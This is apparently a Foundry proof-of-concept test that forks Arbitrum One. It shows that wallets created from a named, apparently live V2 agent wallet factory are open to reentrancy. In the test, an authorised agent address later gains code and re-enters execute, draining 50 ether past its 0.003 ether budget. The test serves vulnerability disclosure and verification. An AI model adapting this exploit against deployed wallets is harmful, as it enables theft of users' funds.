// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {Execution} from "@openzeppelin/contracts/interfaces/draft-IERC7579.sol";

/**
 * Does the _currentAgent reentrancy also affect V2? This does not read the V2 source —
 * it forks Arbitrum One, creates a wallet from the LIVE V2 agent factory, and attacks the
 * real deployed bytecode. Skips cleanly if the RPC is unavailable.
 */
interface IV2Factory {
    function createWallet(uint256 pubKeyX, uint256 pubKeyY, address[3] memory guardians, string calldata credentialId)
        external returns (address wallet);
}

interface IV2Wallet {
    struct AuthorizeParams {
        address   agent;
        uint128   maxPerTxWei;
        uint128   dailyLimitWei;
        uint128   totalBudgetWei;
        uint128   periodBudgetWei;
        uint64    periodDuration;
        uint64    expiry;
        address[] allowedTokens;
        uint128[] tokenMaxAmounts;
        uint128[] tokenDailyLimits;
        uint128[] tokenTotalBudgets;
        address[] allowedProtocols;
        address[] allowedRecipients;
    }
    function authorizeAgent(AuthorizeParams calldata p) external;
    function executeAsAgent(bytes32 mode, bytes calldata executionData) external;
    function execute(bytes32 mode, bytes calldata executionData) external payable;
}

contract V2Reenterer {
    IV2Wallet public immutable WALLET;
    address public immutable SINK;
    uint256 public immutable AMOUNT;
    bytes32 constant BATCH_MODE = 0x0100000000000000000000000000000000000000000000000000000000000000;

    constructor(IV2Wallet w, address sink, uint256 amount) { WALLET = w; SINK = sink; AMOUNT = amount; }

    receive() external payable {
        Execution[] memory evil = new Execution[](1);
        evil[0] = Execution({target: SINK, value: AMOUNT, callData: ""});
        WALLET.execute(BATCH_MODE, abi.encode(evil));
    }
}

contract LegacyV2ReentrancyForkTest is Test {
    bytes32 constant BATCH_MODE = 0x0100000000000000000000000000000000000000000000000000000000000000;
    // V2 AgentWalletFactory — same CREATE2 address on every network it was deployed to.
    address constant V2_AGENT_FACTORY = 0x8D9e24022777173AD6336e00884b6C87c7EF054c;

    uint128 constant TOTAL = 0.003 ether;
    bool forked;

    function setUp() public {
        try vm.createSelectFork(vm.envOr("ARBITRUM_RPC_URL", string("https://arb1.arbitrum.io/rpc"))) {
            forked = true;
        } catch { forked = false; }
    }

    function test_Fork_V2_IsAlsoVulnerable() public {
        if (!forked) { emit log("SKIP: no RPC"); return; }
        assertGt(V2_AGENT_FACTORY.code.length, 0, "V2 factory must be live on this fork");

        address wallet = IV2Factory(V2_AGENT_FACTORY).createWallet(
            uint256(0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296),
            uint256(0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5),
            [address(10), address(11), address(12)],
            "poc-credential"
        );
        assertGt(wallet.code.length, 0, "wallet deployed from the live V2 factory");
        vm.deal(wallet, 100 ether);

        address agent = makeAddr("agentV2");
        address attacker = makeAddr("attackerV2");

        IV2Wallet.AuthorizeParams memory ap;
        ap.agent = agent;                        // code-less at authorization time
        ap.maxPerTxWei = 0.001 ether;
        ap.dailyLimitWei = 0.002 ether;
        ap.totalBudgetWei = TOTAL;
        ap.allowedTokens = new address[](0);
        ap.tokenMaxAmounts = new uint128[](0);
        ap.tokenDailyLimits = new uint128[](0);
        ap.tokenTotalBudgets = new uint128[](0);
        ap.allowedProtocols = new address[](0);
        ap.allowedRecipients = new address[](0);  // permissive default
        vm.prank(wallet);
        IV2Wallet(wallet).authorizeAgent(ap);

        V2Reenterer impl = new V2Reenterer(IV2Wallet(wallet), attacker, 50 ether);
        vm.etch(agent, address(impl).code);       // agent gains code after authorization

        Execution[] memory b = new Execution[](1);
        b[0] = Execution({target: agent, value: 1, callData: ""});
        vm.prank(agent);
        IV2Wallet(wallet).executeAsAgent(BATCH_MODE, abi.encode(b));

        emit log_named_uint("V2 attacker balance (wei)", attacker.balance);
        assertGt(attacker.balance, uint256(TOTAL), "V2 deployed bytecode is vulnerable too");
    }
}
